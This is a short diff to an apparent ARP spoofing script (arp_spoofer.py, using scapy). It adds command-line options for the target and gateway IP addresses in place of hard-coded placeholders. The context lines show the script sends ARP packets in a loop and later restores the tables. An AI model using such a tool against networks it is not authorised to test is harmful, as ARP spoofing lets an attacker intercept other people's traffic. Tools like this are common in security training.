@@ -2,6 +2,18 @@
 
 import scapy.all as scapy
 import time
+import argparse
+
+def get_arguments():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-t","--target",dest="target",help="Target IP Address")
+    parser.add_argument("-g","--gateway",dest="gateway",help="Gateway IP Address\nExample: python3 arp_spoofer.py -t 10.0.1.7 -g 10.0.1.1")
+    options = parser.parse_args()
+    if not options.target:
+        parser.error("[-] Please specify a target's IP address, use --help for more info.")
+    elif not options.gateway:
+        parser.error("[-] Please specify a gateway IP address, use --help for more info.")
+    return options
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
@@ -24,8 +36,9 @@ def restore(destination_ip,source_ip):
 
 
 sending_packets_count = 0
-target_ip="target_ip"
-gateway_ip="router_ip"
+options = get_arguments()
+target_ip=options.target
+gateway_ip=options.gateway
 
 try:
     while True: 
